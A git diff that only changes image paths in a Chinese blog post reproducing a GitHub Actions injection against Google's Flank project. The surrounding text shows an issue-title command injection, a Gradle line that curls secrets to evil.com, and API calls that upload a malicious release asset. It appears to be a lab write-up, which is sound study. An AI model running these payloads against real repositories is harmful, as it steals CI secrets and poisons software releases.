@@ -18,7 +18,7 @@ Flank[1] 是谷歌 Firebase Test lab 开源在 Github 的一个项目，用于�
 
 漏洞整体利用链图解（文章后面会附上复现环境和步骤～）：
 
-![Untitled](/image/2024-05-08/Untitled.png)
+![Untitled](./image/2024-05-08/Untitled.png)
 
 另外，具有写权限的 `GITHUB_TOKEN` 可以用来发布 GitHub Release 以及 Release 附件，从而发布恶意的编译后二进制软件来达到供应链攻击的效果，原文作者由于是 Bug Bounty，渗透讲究点到为止，本文也会涉及这部分利用手段。
 
@@ -28,7 +28,7 @@ Flank[1] 是谷歌 Firebase Test lab 开源在 Github 的一个项目，用于�
 
 Github Action[4] 用于在 Github 代码仓库中自动化、自定义和执行软件开发工作流程，也可用于持续集成持续部署流程（即 CI/CD），十分便于开发者使用，而不用专门去部署一套 Jenkins 之类的用于 CICD。具体表现在 Github 上，就是在代码仓库根目录建一个 `.github` 目录，里面放着一些定义自动化任务的 yaml/yml 文件，称之为 `workflow`（工作流），
 
-![Untitled](/image/2024-05-08/Untitled%201.png)
+![Untitled](./image/2024-05-08/Untitled%201.png)
 
 关于 `.github` 目录大家应该挺眼熟的，但**一般我们都会忽略不太起眼的它，因为一般它不会存在什么特别的安全漏洞**，但本文的重点就是里面的 `workflow`。
 
@@ -92,7 +92,7 @@ jobs:
 
 如果攻击者在这个项目 Github 上新建一个 issue 的标题为 `test" && ls / && echo "` ，会直接造成流水线 runner 里的命令注入
 
-![Untitled](/image/2024-05-08/Untitled%202.png)
+![Untitled](./image/2024-05-08/Untitled%202.png)
 
 即，这种 Action 注入是执行命令时直接拼接了外部可控的变量。
 
@@ -125,11 +125,11 @@ jobs:
 
 在看整个 workflow 文件，在项目 PR 评论区回复 `@flank-it` 会触发 `should_run_it`  job，这个 job env 带有 `GITHUB_TOKEN` secret，并且该 token 有该项目的写权限（如果没有该项目的写权限，这个在评论区加个眼睛 👀 的 emoji 是加不上的）
 
-![Untitled](/image/2024-05-08/Untitled%203.png)
+![Untitled](./image/2024-05-08/Untitled%203.png)
 
 然后 `should_run_it` 运行结果 `run_integration_tests` 为 `true` 会触发 env 带有 `GCLOUD_KEY` secret  的 job
 
-![Untitled](/image/2024-05-08/Untitled%204.png)
+![Untitled](./image/2024-05-08/Untitled%204.png)
 
 到这里，还没讲到，Action 注入的，我们可控的恶意代码在哪呢？目前我们向此仓库发 PR，然后流水线中 `gh checkout 我们的PR` 切换到我们的代码。其实对于一般的流水线，都会有构建操作，即打包代码之类的，这里用的是 `gradle`
 
@@ -210,11 +210,11 @@ if __name__ == "__main__":
 
 - [https://github.com/tarihub/hack-flank-cicd/settings/actions](https://github.com/tarihub/hack-flank-cicd/settings/actions) 需要在这里勾上 Workflow permissions 的 Read and write permissions 权限，不然小眼睛👀交互打不上（其实主要是模拟原项目给了 GITHUB_TOKEN 的写权限）
 
-![Untitled](/image/2024-05-08/Untitled%205.png)
+![Untitled](./image/2024-05-08/Untitled%205.png)
 
 - secret 记得 base64编码一下，不然解码会失败
 
-![Untitled](/image/2024-05-08/Untitled%206.png)
+![Untitled](./image/2024-05-08/Untitled%206.png)
 
 ### 复现步骤
 
@@ -246,19 +246,19 @@ val post = "if [[ \$OSTYPE == \"linux-gnu\" ]]; then curl -X POST http://evil.co
 
 commit 并 push 后发送 PR 到原仓库，在 PR 评论区留言 `@flank-it` 触发 Github Action
 
-![Untitled](/image/2024-05-08/Untitled%207.png)
+![Untitled](./image/2024-05-08/Untitled%207.png)
 
 运行过程，这里为了方查看所以直接输出
 
-![Untitled](/image/2024-05-08/Untitled%208.png)
+![Untitled](./image/2024-05-08/Untitled%208.png)
 
 正常情况下利用，由于非项目成员，看不到运行结果，所以需要用 curl 外带
 
-![Untitled](/image/2024-05-08/Untitled%209.png)
+![Untitled](./image/2024-05-08/Untitled%209.png)
 
 就得到 GCLOUD_KEY 和 GITHUB_TOKEN
 
-![Untitled](/image/2024-05-08/Untitled%2010.png)
+![Untitled](./image/2024-05-08/Untitled%2010.png)
 
 base64解码得 `flag{GCLOUD_KEY}`
 
@@ -279,7 +279,7 @@ curl -L \
   https://api.github.com/repos/OWNER/REPO/releases/latest
 ```
 
-![Untitled](/image/2024-05-08/Untitled%2011.png)
+![Untitled](./image/2024-05-08/Untitled%2011.png)
 
 然后通过接口增加/修改 release 附件即可
 
@@ -294,11 +294,11 @@ curl -L \
   --data-binary "@evil.txt"
 ```
 
-![Untitled](/image/2024-05-08/Untitled%2012.png)
+![Untitled](./image/2024-05-08/Untitled%2012.png)
 
 来到 Github Release 页面就看到我们的恶意附件就上传上去了
 
-![Untitled](/image/2024-05-08/Untitled%2013.png)
+![Untitled](./image/2024-05-08/Untitled%2013.png)
 
 至于 `GCLOUD_KEY` 的进一步利用，网上有很多文章介绍，这里就不进一步深入了
 
